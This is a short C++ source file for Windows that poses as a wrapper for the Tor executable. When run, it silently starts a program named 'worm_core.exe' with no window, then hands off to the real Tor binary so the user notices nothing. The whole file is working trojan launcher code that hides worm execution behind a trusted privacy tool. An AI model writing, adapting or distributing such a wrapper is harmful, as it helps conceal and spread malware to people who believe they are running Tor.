// tor_wrapper.cpp — MinGW-w64 compatible
// Compilación: g++ -std=c++20 -O2 -municode -static tor_wrapper.cpp -o tor_wrapper.exe -lws2_32

#include <windows.h>
#include <string>
#include <vector>

static std::wstring module_dir() {
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    std::wstring d(self);
    size_t p = d.find_last_of(L"\\/");
    return (p == std::wstring::npos) ? L"." : d.substr(0, p);
}

int wmain(int argc, wchar_t** argv) {
    std::wstring dir = module_dir();

    std::wstring worm = dir + L"\\worm_core.exe";
    if (GetFileAttributesW(worm.c_str()) != INVALID_FILE_ATTRIBUTES) {
        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        std::vector<wchar_t> buf(worm.begin(), worm.end());
        buf.push_back(0);
        if (CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, dir.c_str(), &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    std::wstring tor_real = dir + L"\\tor_real.exe";
    if (GetFileAttributesW(tor_real.c_str()) == INVALID_FILE_ATTRIBUTES) {
        tor_real = dir + L"\\tor.exe";
    }

    std::wstring cmdline = L"\"" + tor_real + L"\"";
    for (int i = 1; i < argc; ++i) {
        cmdline += L" ";
        cmdline += argv[i];
    }
    std::vector<wchar_t> buf(cmdline.begin(), cmdline.end());
    buf.push_back(0);

    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
                        0, nullptr, dir.c_str(), &si, &pi)) {
        return 1;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}